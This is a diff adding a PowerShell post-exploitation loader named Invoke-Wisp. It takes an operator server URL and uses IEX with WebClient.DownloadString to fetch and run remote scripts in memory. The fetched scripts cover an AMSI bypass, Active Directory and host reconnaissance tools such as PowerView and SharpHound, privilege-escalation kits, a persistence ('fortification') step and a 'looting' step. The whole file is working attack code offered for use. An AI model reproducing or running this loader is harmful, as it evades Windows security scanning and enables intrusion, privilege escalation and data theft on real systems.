@@ -1,0 +1,82 @@
+<#
+    CREATED BY KARMAZ
+#>
+$global:url_1029384756=$null
+$global:memory_loaded_1029384756=0
+
+function Invoke-Wisp {
+    [Parameter(Mandatory, HelpMessage = "Please provide an server url address using -url 'http://<your_server>/'")]
+    Param([string]$url)
+    $global:url_1029384756=$url
+    bypass_amsi
+}
+
+function bypass_amsi {
+    if($global:url_1029384756 -eq $null){
+        Write-Host -NoNewline -ForegroundColor DarkRed " [ERROR]"
+        Write-Host -NoNewline -ForegroundColor Yellow " Use "
+        Write-Host -NoNewline -ForegroundColor DarkYellow "Invoke-Wisp -Url 'http://<your_server>/' "
+        Write-Host -NoNewline -ForegroundColor Yellow "first, to set the URL for the functions."
+        return
+    }
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/isma.txt")
+}
+
+function memory_load {
+    if($url_1029384756 -eq $null){
+        Write-Host -NoNewline -ForegroundColor DarkRed " [ERROR]"
+        Write-Host -NoNewline -ForegroundColor Yellow " Use "
+        Write-Host -NoNewline -ForegroundColor DarkYellow "Invoke-Wisp -Url 'http://<your_server>/' "
+        Write-Host -NoNewline -ForegroundColor Yellow "first, to set the URL for the functions."
+        return
+    }
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/HostRecon.txt")
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/PrivescCheck.txt")
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/PowerUp.txt")
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/PowerView.txt")
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/SharpHound.txt")
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/adPEAS.txt")
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/LAPSToolkit.txt")
+    IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/PowerUpSQL.txt")
+    IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/Invoke-Portscan.txt")
+    $global:memory_loaded_1029384756=1
+}
+
+function escalation {
+    if($url_1029384756 -eq $null){
+        Write-Host -NoNewline -ForegroundColor DarkRed " [ERROR]"
+        Write-Host -NoNewline -ForegroundColor Yellow " Use "
+        Write-Host -NoNewline -ForegroundColor DarkYellow "Invoke-Wisp -Url '<your_server>' "
+        Write-Host -NoNewline -ForegroundColor Yellow "first, to set the URL for the functions."
+        return
+    }
+    if($memory_loaded_1029384756 -eq 1){
+        IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/escalate.txt")
+    }else{
+        memory_load
+        escalation
+    }
+}
+
+function fortification {
+    if($url_1029384756 -eq $null){
+        Write-Host -NoNewline -ForegroundColor DarkRed " [ERROR]"
+        Write-Host -NoNewline -ForegroundColor Yellow " Use "
+        Write-Host -NoNewline -ForegroundColor DarkYellow "Invoke-Wisp -Url '<your_server>' "
+        Write-Host -NoNewline -ForegroundColor Yellow "first, to set the URL for the functions."
+        return
+    }
+    IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/fort.txt")
+}
+
+function looting {
+    if($url_1029384756 -eq $null){
+        Write-Host -NoNewline -ForegroundColor DarkRed " [ERROR]"
+        Write-Host -NoNewline -ForegroundColor Yellow " Use "
+        Write-Host -NoNewline -ForegroundColor DarkYellow "Invoke-Wisp -Url '<your_server>' "
+        Write-Host -NoNewline -ForegroundColor Yellow "first, to set the URL for the functions."
+        return
+    }
+    fortification
+    IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/loot.txt")
+}
